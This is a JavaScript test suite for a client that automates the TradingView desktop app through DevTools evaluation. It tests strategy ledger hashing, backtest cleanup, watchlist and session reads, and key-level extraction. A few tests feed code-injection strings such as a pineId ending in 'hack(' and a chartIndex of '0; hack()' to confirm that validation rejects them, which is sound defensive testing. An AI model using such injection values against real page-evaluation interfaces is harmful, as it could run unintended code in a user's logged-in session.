    inputValues: [
      { id: "pineId", value: "USER;12345678abcdef12" },
      { id: "pineVersion", value: "4.0" },
      { id: "text", value: "secret source is excluded" },
      { id: "in_0", value: 14 },
      // Strategy Properties arrive as the strategy study's own inputs.
      { id: "in_1", value: 0.00005 },
      { id: "in_2", value: 100_000 },
    ],
  };
  const studyApi = {
    getInputsInfo: () => [{ id: "in_0", localizedName: "Length" }, { id: "in_1", localizedName: "Commission Value" },
      { id: "in_2", localizedName: "Initial Capital" }],
    getInputValues: () => fx.inputValues.map((value) => ({ ...value })),
  };
  fx.chart = {
    symbol: () => fx.symbol,
    resolution: () => "60",
    getAllStudies: () => [{ id: "strategy-1", name: "Ledger Strategy" }],
    getStudyById: () => studyApi,
    _chartWidget: { _lineToolsSynchronizer: { _chartModel: { activeStrategySource: () => ({ value: () => fx.source }) } } },
  };
  fx.source = { id: () => "strategy-1", metaInfo: () => ({ description: "Ledger Strategy" }), reportData: () => fx.report };
  fx.api = { activeChart: () => fx.chart };
  // onDigest(n) runs after the n-th SHA-256 the page computes: 1 = ledger, 2 = report state.
  fx.run = (expression, onDigest) => {
    let digests = 0;
    const crypto = onDigest ? { subtle: { digest: async (...args) => {
      const digest = await webcrypto.subtle.digest(...args);
      onDigest(++digests);
      return digest;
    } } } : webcrypto;
    return vm.runInContext(expression, vm.createContext({ crypto, TextEncoder, window: { TradingViewApi: fx.api } }));
  };
  return fx;
}

const sha256Json = (value) => "sha256:" + createHash("sha256").update(JSON.stringify(value)).digest("hex");
const plain = (value) => JSON.parse(JSON.stringify(value));

test("bound Strategy Tester reads reject a same-name study and a pane change mid-read", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const fx = strategyLedgerFixture();
  let index = 0;
  fx.api.activeChartIndex = () => index;
  await tv.getStrategyReport({ chartIndex: 0, expectedStudyId: "strategy-1" });
  await tv.getStrategyTradeLedger({ chartIndex: 0, expectedStudyId: "strategy-1" });
  const [reportExpr, ledgerExpr] = cdp.calls;
  assert.equal((await fx.run(reportExpr)).totalTrades, 1);
  assert.equal((await fx.run(ledgerExpr)).studyId, "strategy-1");
  fx.source.id = () => "another-strategy";
  await assert.rejects(fx.run(reportExpr), /requested chart or study/);
  await assert.rejects(fx.run(ledgerExpr), /requested study/);
  fx.source.id = () => "strategy-1";
  await assert.rejects(fx.run(ledgerExpr, () => { index = 1; }), /changed during the bound read/);
});

test("bound trade ledgers reject in-place changes during hashing", async () => {
  const cdp = fakeCdp({});
  await new TradingView(cdp).getStrategyTradeLedger({ chartIndex: 0, expectedStudyId: "strategy-1" });
  const mutations = [
    [fx => { fx.report.trades[0].q += 1; }, /report contents changed/],
    [fx => { fx.report.performance.all.netProfit += 1; }, /report summary changed/],
    [fx => { fx.inputValues[3].value += 1; }, /strategy inputs changed/],
  ];
  for (const [change, error] of mutations) {
    const fx = strategyLedgerFixture();
    fx.api.activeChartIndex = () => 0;
    await assert.rejects(fx.run(cdp.calls[0], () => change(fx)), error);
  }
});

test("report state capture returns the state and hash that a later identity read verifies", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  for (const bad of [{ captureReportState: false }, { captureReportState: true, identityStudyId: "strategy-1" },
    { captureReportState: true, expectedReportStateSha256: "sha256:" + "c".repeat(64) }]) {
    assert.throws(() => tv.getStrategyTradeLedger(bad), /report state capture takes only/);
  }
  assert.equal(cdp.calls.length, 0);
  const fx = strategyLedgerFixture();
  await tv.getStrategyTradeLedger({ captureReportState: true });
  const captureExpr = cdp.calls.at(-1);
  const capture = plain(await fx.run(captureExpr));
  await tv.getStrategyTradeLedger({ offset: 0, limit: 500 });
  const page = await fx.run(cdp.calls.at(-1));
  assert.equal(Object.hasOwn(page, "reportStateSha256"), false, "ordinary pages keep their schema");
  const state = {
    schema: "pine_report_state_v1", ledgerId: page.ledgerId, studyId: "strategy-1", currency: "USD",
    metrics: {
      netProfit: 125, netProfitPercent: 0.00125, maxDrawdown: 40, maxDrawdownPercent: 0.0004,
      totalTrades: 1, winningTrades: 1, profitFactor: 1.2, percentProfitable: 0.5,
    },
    openProfit: 25, totalProfit: null,
  };
  assert.deepEqual(capture, {
    ledgerId: page.ledgerId, studyId: "strategy-1", pineId: "USER;12345678abcdef12", pineVersion: "4.0",
    reportStateSha256: sha256Json(state), reportStateSchema: "pine_report_state_v1", reportState: state,
  });
  assert.equal(sha256Json(capture.reportState), capture.reportStateSha256, "the returned state rehashes to the capture");
  assert.ok(Buffer.byteLength(JSON.stringify(capture)) < 8192);

  await tv.getStrategyTradeLedger({ identityStudyId: capture.studyId, expectedLedgerId: capture.ledgerId,
    expectedReportStateSha256: capture.reportStateSha256 });
  assert.deepEqual(plain(await fx.run(cdp.calls.at(-1))), {
    ledgerId: capture.ledgerId, studyId: "strategy-1", pineId: "USER;12345678abcdef12", pineVersion: "4.0",
    reportStateSha256: capture.reportStateSha256,
  });
  await tv.getStrategyTradeLedger({ captureReportState: true, expectedLedgerId: capture.ledgerId });
  assert.equal((await fx.run(cdp.calls.at(-1))).reportStateSha256, capture.reportStateSha256);
  await tv.getStrategyTradeLedger({ captureReportState: true, expectedLedgerId: "sha256:" + "0".repeat(64) });
  await assert.rejects(fx.run(cdp.calls.at(-1)), /captured strategy ledger does not match/);
  // A changed strategy Property is a changed study input: a new ledger id, so the
  // earlier capture no longer verifies.
  const identityExpr = cdp.calls.findLast((call) => call.includes('const identityStudyId = "strategy-1"'));
  fx.inputValues[4] = { id: "in_1", value: 0.0001 };
  const changed = plain(await fx.run(captureExpr));
  assert.notEqual(changed.ledgerId, capture.ledgerId);
  assert.equal(changed.reportState.metrics.netProfit, capture.reportState.metrics.netProfit);
  await assert.rejects(fx.run(identityExpr), /captured strategy ledger does not match/);
  fx.inputValues[4] = { id: "in_1", value: 0.00005 };
  delete fx.report.currency;
  await assert.rejects(fx.run(captureExpr), /key metrics or currency unconfirmed/);
  fx.report.currency = "USD";
  fx.source.id = () => undefined;
  await assert.rejects(fx.run(captureExpr), /study id is unconfirmed for report state capture/);
});

test("capture and identity reads refuse unconfirmed versions, ids, inputs, counts and metrics", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.getStrategyTradeLedger({ captureReportState: true });
  const captureExpr = cdp.calls.at(-1);
  const capture = plain(await strategyLedgerFixture().run(captureExpr));
  // An identity read against whatever the fixture now shows: its current ledger
  // id and the captured state rebound to that id, so only the guard can refuse.
  const identityRun = async (fx, stateChanges) => {
    await tv.getStrategyTradeLedger({ offset: 0, limit: 500 });
    const { ledgerId } = await fx.run(cdp.calls.at(-1));
    await tv.getStrategyTradeLedger({ identityStudyId: "strategy-1", expectedLedgerId: ledgerId,
      expectedReportStateSha256: sha256Json({ ...capture.reportState, ledgerId, ...stateChanges }) });
    return fx.run(cdp.calls.at(-1));
  };
  const cases = [
    ["moving last version", (fx) => { fx.inputValues[1] = { id: "pineVersion", value: "last" }; }, {}, /fixed Pine version is unconfirmed/],
    ["foreign Pine id", (fx) => { fx.inputValues[0] = { id: "pineId", value: "PUB;abcdef1234567890" }; }, {}, /fixed Pine version is unconfirmed/],
    ["unsupported input value", (fx) => { fx.inputValues[3] = { id: "in_0", value: { nested: 1 } }; }, {}, /fixed Pine version is unconfirmed/],
    ["trade count mismatch", (fx) => { fx.report.performance.all.totalTrades = 3; },
      { metrics: { ...capture.reportState.metrics, totalTrades: 3 } }, /fixed Pine version is unconfirmed/],
    ["missing metric", (fx) => { delete fx.report.performance.all.profitFactor; }, {}, /key metrics or currency unconfirmed/],
    ["open position without open profit", (fx) => { delete fx.report.performance.openPL; }, {}, /key metrics or currency unconfirmed/],
  ];
  for (const [name, change, stateChanges, reason] of cases) {
    const fx = strategyLedgerFixture();
    change(fx);
    await assert.rejects(fx.run(captureExpr), reason, name + " (capture)");
    await assert.rejects(identityRun(fx, stateChanges), reason, name + " (identity)");
  }
});

test("capture and identity reads fail closed when the chart, report, trades or inputs change mid-read", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  await tv.getStrategyTradeLedger({ captureReportState: true });
  const captureExpr = cdp.calls.at(-1);
  const capture = plain(await strategyLedgerFixture().run(captureExpr));
  await tv.getStrategyTradeLedger({ identityStudyId: capture.studyId, expectedLedgerId: capture.ledgerId,
    expectedReportStateSha256: capture.reportStateSha256 });
  const identityExpr = cdp.calls.at(-1);
  const changes = [
    ["active chart", (fx) => { const chart = fx.chart; fx.api.activeChart = () => ({ ...chart }); }, /active strategy or report changed during/],
    ["active strategy", (fx) => { fx.source = { ...fx.source }; }, /active strategy or report changed during/],
    ["report object", (fx) => { fx.report = { ...fx.report }; }, /active strategy or report changed during/],
    ["symbol", (fx) => { fx.symbol = "OANDA:USDJPY"; }, /active strategy or report changed during/],
    ["trades array", (fx) => { fx.report.trades = fx.report.trades.slice(); }, /report contents changed during/],
    ["input value", (fx) => { fx.inputValues[3] = { id: "in_0", value: 15 }; }, /inputs changed during/],
  ];
  for (const [name, change, reason] of changes) {
    for (const [mode, expression, purpose] of [["capture", captureExpr, /report state capture/],
      ["identity", identityExpr, /Pine identity verification/]]) {
      const fx = strategyLedgerFixture();
      await assert.doesNotReject(fx.run(expression), name + " " + mode + " control");
      await assert.rejects(fx.run(expression, (n) => { if (n === 2) change(fx); }), (error) => {
        assert.match(error.message, reason, name + " " + mode);
        assert.match(error.message, purpose, name + " " + mode);
        return true;
      });
    }
  }
});

test("fixed Pine hashes refuse a source that UTF-8 cannot represent", async () => {
  const cdp = fakeCdp({});
  await new TradingView(cdp).getFixedPineSourceHashes("USER;12345678abcdef12", "4.0");
  const body = JSON.stringify({ scriptIdPart: "USER;12345678abcdef12", version: "4.0", source: "plot(close)\uD800\n" });
  await assert.rejects(fixedPinePage(cdp.calls[0], body), /not representable as UTF-8/);
});

test("runBacktest validates inputs and cleans the chart up by default", async () => {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  for (const bad of ["PUB;abcdef1234567890", "USER;short", "", 'USER;x"); hack(']) {
    assert.throws(() => tv.runBacktest({ pineId: bad }), /pineId must look like/, bad);
  }
  assert.throws(
    () => tv.runBacktest({ pineId: "USER;71f1e4e6807c4bb48bd55edb886908a0", tradesLimit: 501 }),
    /tradesLimit must be/,
  );
  assert.equal(cdp.calls.length, 0);

  await tv.runBacktest({ pineId: "USER;71f1e4e6807c4bb48bd55edb886908a0" });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"USER;71f1e4e6807c4bb48bd55edb886908a0"'), "pineId quoted as JSON");
  assert.ok(expr.includes("isTVScriptStrategy !== true"), "non-strategy scripts must be refused");
  assert.ok(expr.includes('{ type: "pine", pineId, version: fixedVersion ?? "last" }'), "insert by pine descriptor");
  assert.ok(expr.includes("const keep = false"), "auto-remove is the default");
  assert.ok(expr.includes("chart.removeEntity(studyId)"), "must remove the strategy again");
  assert.ok(expr.includes("if (!keep || failure !== null)"),
    "a failed kept run must still remove its temporary strategy");
  assert.ok(expr.includes("activeDesc === meta.description"),
    "the report must be attributed to OUR strategy before being accepted");
  // re-testing a saved new version keeps the same strategy name, so the
  // previous run must be rejected by object identity, not just by name
  assert.ok(expr.includes("const staleReport = bt.activeStrategyReportData.value()"),
    "the pre-run report must be captured");
  assert.ok(expr.includes("raw !== staleReport"),
    "a leftover report of the same-named strategy must be refused");
  assert.ok(expr.includes("WARNING: the strategy may still be on the chart"),
    "failed cleanup must be reported");

  await tv.runBacktest({ pineId: "USER;71f1e4e6807c4bb48bd55edb886908a0", keepOnChart: true });
  assert.ok(cdp.calls[1].includes("const keep = true"));
});

// BACKLOG 102-22: the backtest's page code run against a fake chart. `fault` makes reading the report throw ("report"),
// shaping it throw ("format"), or never arrive ("timeout"); `removeFails` makes removing the strategy throw.
async function backtestPage({ fault = null, removeFails = false, keepOnChart = false, pineVersion, expectedChart } = {}) {
  const cdp = fakeCdp({});
  const tv = new TradingView(cdp);
  const pineId = "USER;71f1e4e6807c4bb48bd55edb886908a0";
  await tv.runBacktest({ pineId, keepOnChart, pineVersion, chartIndex: pineVersion === undefined ? undefined : 0, expectedChart });
  const removed = [];
  const descriptors = [];
  let reportReads = 0;
  let clock = 0;
  const report = { currency: "USD", performance: { all: { totalTrades: 1 }, initialCapital: 10_000 }, trades: [] };
  const source = { id: () => fault === "same name" ? "other" : "st7", metaInfo: () => ({ description: "My Strategy" }) };
  const bt = {
    activeStrategy: { value: () => {
      if (fault === "format") throw new Error("activeStrategy getter exploded");
      return source;
    } },
    activeStrategyMetaInfo: { value: () => ({ description: "My Strategy" }) },
    activeStrategyReportData: { value: () => {
      reportReads += 1;
      if (reportReads === 1) return null; // the report before this run
      if (fault === "report") throw new Error("report getter exploded");
      if (fault === "empty error") throw new Error("");
      if (fault === "empty string") throw "";
      return fault === "timeout" ? null : report;
    } },
  };
  const chart = {
    createStudy: async (descriptor) => { descriptors.push(plain(descriptor)); return "st7"; },
    symbol: () => "OANDA:EURUSD",
    resolution: () => "5",
    getStudyById: () => ({ getInputValues: () => [
      { id: "pineId", value: pineId }, { id: "pineVersion", value: fault === "wrong version" ? "9.0" : pineVersion },
    ] }),
    removeEntity: (id) => {
      if (removeFails) throw new Error("chart refused the removal");
      removed.push(id);
    },
  };
  // A clock that moves a second per reading and timers that fire at once, so the 20-second wait passes in no time.
  class FakeDate extends Date { static now() { return (clock += 1_000); } }
  const context = vm.createContext({
    Date: FakeDate,
    setTimeout: (fn) => { fn(); return 0; },
    window: { TradingViewApi: {
      activeChart: () => chart,
      activeChartIndex: () => 0,
      studyMetaIntoRepository: () => ({ findById: async (descriptor) => {
        descriptors.push(plain(descriptor));
        return { isTVScriptStrategy: true, description: "My Strategy" };
      } }),
      backtestingStrategyApi: async () => bt,
    } },
  });
  return { outcome: vm.runInContext(cdp.calls[0], context), removed, descriptors };
}

test("a numbered backtest binds the descriptor, active study and actual Pine version", async () => {
  const page = await backtestPage({ pineVersion: "1.0" });
  assert.equal((await page.outcome).totalTrades, 1);
  assert.deepEqual(page.descriptors.map(row => row.version), ["1.0", "1.0"]);
  assert.deepEqual(page.removed, ["st7"]);
  for (const [fault, error] of [["same name", /did not appear/], ["wrong version", /requested fixed Pine version/]]) {
    const rejected = await backtestPage({ fault, pineVersion: "1.0", keepOnChart: true });
    await assert.rejects(rejected.outcome, error);
    assert.deepEqual(rejected.removed, ["st7"]);
  }
});

test("a fixed experiment rejects a changed symbol or timeframe before creating a strategy", async () => {
  for (const expectedChart of [{ symbol: "OANDA:GBPUSD", resolution: "5" }, { symbol: "OANDA:EURUSD", resolution: "60" }]) {
    const page = await backtestPage({ pineVersion: "1.0", expectedChart });
    await assert.rejects(page.outcome, /active chart symbol or timeframe does not match/);
    assert.deepEqual(page.descriptors, []);
    assert.deepEqual(page.removed, []);
  }
});

test("a backtest that fails after placing its strategy removes it, kept or not, and names the cause", async () => {
  const causes = {
    report: /^report getter exploded — the strategy was removed from the chart$/,
    format: /^activeStrategy getter exploded — the strategy was removed from the chart$/,
    timeout: /^backtest report did not appear within 20s .* — the strategy was removed from the chart$/,
    // A cause with no message is a failure all the same, and is described.
    "empty error": /^the page threw an error with no message — the strategy was removed from the chart$/,
    "empty string": /^the page threw an empty string — the strategy was removed from the chart$/,
  };
  for (const [fault, cause] of Object.entries(causes)) {
    for (const keepOnChart of [false, true]) {
      const page = await backtestPage({ fault, keepOnChart });
      await assert.rejects(page.outcome, (error) => cause.test(error.message), `${fault}, keep ${keepOnChart}`);
      assert.deepEqual(page.removed, ["st7"], `${fault}, keep ${keepOnChart}`);
    }
  }
});

test("when removing the strategy fails too, the cause still leads and the study is named", async () => {
  const failed = await backtestPage({ fault: "report", removeFails: true });
  await assert.rejects(failed.outcome, (error) => error.message ===
    "report getter exploded — WARNING: the strategy may still be on the chart as study st7 (removing it failed: chart refused the removal)");
  // A run that succeeded but could not remove its strategy returns the study id, so the caller can remove it.
  const succeeded = await backtestPage({ removeFails: true });
  const result = await succeeded.outcome;
  assert.deepEqual([result.studyId, result.keptOnChart, result.removedFromChart], ["st7", false, false]);
  assert.match(result.warning, /could not remove the strategy from the chart: chart refused the removal/);
});

test("a successful backtest removes its strategy unless asked to keep it", async () => {
  const removedRun = await backtestPage();
  const removed = await removedRun.outcome;
  assert.deepEqual([removed.studyId, removed.keptOnChart, removed.removedFromChart, removed.totalTrades], [null, false, true, 1]);
  assert.deepEqual(removedRun.removed, ["st7"]);
  const keptRun = await backtestPage({ keepOnChart: true });
  const kept = await keptRun.outcome;
  assert.deepEqual([kept.studyId, kept.keptOnChart, kept.removedFromChart], ["st7", true, false]);
  assert.deepEqual(keptRun.removed, []);
});

test("getChartRect validates the index and reads the chart container rect", async () => {
  const cdp = fakeCdp({ x: 0, y: 0, width: 100, height: 100, devicePixelRatio: 2 });
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getChartRect(-1), /chartIndex must be/);
  assert.throws(() => tv.getChartRect(1.5), /chartIndex must be/);
  assert.throws(() => tv.getChartRect("0; hack()"), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0);

  await tv.getChartRect(1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes('querySelectorAll(".chart-container")'));
  assert.ok(expr.includes("out of range"), "must fail clearly for a missing chart");
  assert.ok(expr.includes("devicePixelRatio"));
});

test("getWatchlists fetches the symbols_list API with the app session", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getWatchlists();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("https://www.tradingview.com/api/v1/symbols_list/custom/"));
  assert.ok(expr.includes('credentials: "include"'), "must use the logged-in session");
  assert.ok(expr.includes('startsWith("###")'), "must handle section headers");
});

test("getChartContext returns the page value as-is", async () => {
  const ctx = { layoutName: "L", activeChartIndex: 0, chartsCount: 1, charts: [] };
  const tv = new TradingView(fakeCdp(ctx));
  assert.deepEqual(await tv.getChartContext(), ctx);
});

test("getExecutionQuotes reads bounded live quote and session fields from every chart", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getExecutionQuotes();
  const expr = cdp.calls[0];
  assert.ok(expr.includes("series.quotes"));
  assert.ok(expr.includes("quote.lp_time"));
  assert.ok(expr.includes("quote.current_session"));
  assert.ok(expr.includes("quote.hub_rt_loaded"));
  assert.ok(expr.includes("info.session"));
});

test("getTradingSessionMetadata executes a bounded calendar-only read bound to an explicit chart", async () => {
  const cdp = fakeCdp();
  await new TradingView(cdp).getTradingSessionMetadata(1);
  const info = { full_name: "PEPPERSTONE:MXNJPY", timezone: "America/New_York", session: "1700-1659:2345|1700-1655:6",
    session_holidays: "20261225", corrections: "1700-1400:20261224", subsession_id: "regular",
    subsessions: [{ id: "regular", session: "1700-1659:2345|1700-1655:6", ignored: "unrelated" }], private_account: "DO_NOT_READ" };
  const context = { window: { TradingViewApi: { chart: (index) => {
    assert.equal(index, 1);
    return { symbol: () => "PEPPERSTONE:MXNJPY", resolution: () => "240", chartModel: () => ({ mainSeries: () => ({ symbolInfo: () => info }) }) };
  } } } };
  const value = JSON.parse(JSON.stringify(vm.runInNewContext(cdp.calls[0], context)));
  assert.equal(value.chartIndex, 1); assert.equal(value.symbol, info.full_name); assert.equal(value.fullName, info.full_name);
  assert.equal(value.sessionHolidays, "20261225"); assert.equal(value.corrections, "1700-1400:20261224");
  assert.deepEqual(value.subsessions, [{ id: "regular", session: info.session }]);
  assert.equal(JSON.stringify(value).includes("DO_NOT_READ"), false);
  assert.deepEqual(Object.keys(value).sort(), ["source", "chartIndex", "symbol", "resolution", "fullName", "timezone", "session", "sessionHolidays", "corrections", "subsessionId", "subsessions"].sort());
  info.session = "x".repeat(4097);
  assert.throws(() => vm.runInNewContext(cdp.calls[0], context), /oversized/);
  info.session = "24x7"; info.subsessions = Array.from({ length: 17 }, () => ({ id: "x" }));
  assert.throws(() => vm.runInNewContext(cdp.calls[0], context), /oversized/);
  assert.throws(() => new TradingView(cdp).getTradingSessionMetadata(-1), /chartIndex/);
});

test("indicator values and graphics expose the is_price_study flag", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues();
  await tv.getIndicatorGraphics();
  for (const expr of cdp.calls) {
    assert.ok(expr.includes("is_price_study"), "metaInfo flag must be read");
  }
});

/** Fake CdpClient that returns one queued result (or Error) per evaluate call. */
function fakeCdpSeq(results) {
  const calls = [];
  let i = 0;
  return {
    calls,
    evaluate(expression) {
      calls.push(expression);
      const r = results[i++];
      return r instanceof Error ? Promise.reject(r) : Promise.resolve(r);
    },
  };
}

// getKeyLevels evaluates in a fixed order: OHLCV, then values, then graphics.
const keyLevelsOhlcv = {
  symbol: "OANDA:EURUSD",
  resolution: "1D",
  count: 1,
  bars: [{ time: 1000, timeIso: "x", open: 100, high: 100, low: 100, close: 100, volume: 1 }],
};
const keyLevelsValues = [
  // oscillator pane: its "prices" must never become levels
  { id: "a", name: "RSI", isPriceStudy: false, plots: [], bars: [{ time: 1000, values: { Signal: 100.5 } }] },
  {
    id: "b",
    name: "SR",
    isPriceStudy: true,
    plots: [],
    bars: [
      {
        time: 1000,
        // high / close / plot_5 are in-band but generically titled: the
        // current bar's own prices must not come back as "key levels"
        values: { R1: 102, S1: 98, Far: 200, Txt: "x", Nul: null, high: 100.4, close: 100.1, plot_5: 99.8 },
      },
    ],
  },
  // no flag at all: keep (only an explicit false excludes)
  { id: "c", name: "NoFlag", plots: [], bars: [{ time: 1000, values: { Pivot: 99 } }] },
];
const keyLevelsGraphics = [
  {
    id: "d",
    name: "SMC",
    isPriceStudy: true,
    totals: { labels: 1, lines: 3, boxes: 1 },
    labels: [{ time: 1500, price: 99.5, text: "OB", size: null }],
    lines: [
      { time1: 1, price1: 101, time2: 2000, price2: 101, extend: "right", width: 1 },
      { time1: 1, price1: 101, time2: 2000, price2: 101, extend: "right", width: 1 }, // duplicate
      { time1: 1, price1: 90, time2: 2000, price2: 101.5, extend: null, width: 1 }, // sloped
    ],
    boxes: [{ time1: 1, time2: 2000, priceHigh: 102.5, priceLow: 97.5, text: "FVG" }],
  },
  {
    id: "e",
    name: "OscDraw",
    isPriceStudy: false,
    totals: { labels: 1, lines: 0, boxes: 0 },
    labels: [{ time: 1, price: 100.2, text: "osc", size: null }],
    lines: [],
    boxes: [],
  },
];

test("getKeyLevels validates inputs before touching the page", async () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  for (const bad of [0, -1, 51, NaN]) {
    await assert.rejects(() => tv.getKeyLevels({ rangePercent: bad }), /rangePercent must be/, String(bad));
  }
  for (const bad of [0, 201, 1.5]) {
    await assert.rejects(() => tv.getKeyLevels({ limit: bad }), /limit must be/, String(bad));
  }
  await assert.rejects(() => tv.getKeyLevels({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getKeyLevels aggregates plots, horizontal lines, box edges and labels near price", async () => {
  const cdp = fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]);
  const tv = new TradingView(cdp);
  const r = await tv.getKeyLevels();

  assert.equal(r.symbol, "OANDA:EURUSD");
  assert.equal(r.price, 100);
  assert.equal(r.rangePercent, 3);
  // sorted by absolute distance; duplicates collapsed; oscillators, the
  // out-of-band plot (200), non-numeric values, sloped lines and
  // generically-titled plots (high/close/plot_5) excluded
  assert.deepEqual(
    r.levels.map((l) => [l.price, l.kind, l.study, l.detail]),
    [
      [99.5, "label", "SMC", "OB"],
      [99, "plot", "NoFlag", "Pivot"],
      [101, "line", "SMC", "horizontal line (extend: right)"],
      [102, "plot", "SR", "R1"],
      [98, "plot", "SR", "S1"],
      [102.5, "box", "SMC", "box top: FVG"],
      [97.5, "box", "SMC", "box bottom: FVG"],
    ],
  );
  assert.equal(r.count, 7);
  assert.equal(r.levels[0].distancePercent, -0.5);
  assert.equal(r.levels[3].distancePercent, 2);
  assert.ok(!JSON.stringify(r).includes("100.5"), "oscillator values must not leak");
  for (const near of [100.4, 100.1, 99.8]) {
    assert.ok(
      !r.levels.some((l) => l.price === near),
      `generic plot value ${near} must not become a level`,
    );
  }
});

test("getKeyLevels includeAllPlots keeps generically-titled plots", async () => {
  const tv = new TradingView(fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]));
  const r = await tv.getKeyLevels({ includeAllPlots: true });
  for (const near of [100.4, 100.1, 99.8]) {
    assert.ok(r.levels.some((l) => l.price === near), `expected ${near} with includeAllPlots`);
  }
});

test("getKeyLevels honors rangePercent and limit", async () => {
  const narrow = new TradingView(fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]));
  const r1 = await narrow.getKeyLevels({ rangePercent: 1 });
  assert.deepEqual(r1.levels.map((l) => l.price), [99.5, 99, 101]);

  const limited = new TradingView(fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, keyLevelsGraphics]));
  const r2 = await limited.getKeyLevels({ limit: 2 });
  assert.deepEqual(r2.levels.map((l) => l.price), [99.5, 99]);
  assert.equal(r2.count, 2);
});

test("getKeyLevels treats a chart without indicators as zero levels", async () => {
  const noStudies = new Error("no indicators on this chart");
  const tv = new TradingView(fakeCdpSeq([keyLevelsOhlcv, noStudies, noStudies]));
  const r = await tv.getKeyLevels();
  assert.equal(r.count, 0);
  assert.deepEqual(r.levels, []);
});

test("getKeyLevels propagates real failures instead of hiding them", async () => {
  const tv = new TradingView(
    fakeCdpSeq([keyLevelsOhlcv, keyLevelsValues, new Error("TradingView desktop app is not reachable")]),
  );
  await assert.rejects(() => tv.getKeyLevels(), /not reachable/);

  const noBars = new TradingView(fakeCdpSeq([{ ...keyLevelsOhlcv, bars: [] }]));
  await assert.rejects(() => noBars.getKeyLevels(), /no bar data loaded/);
});
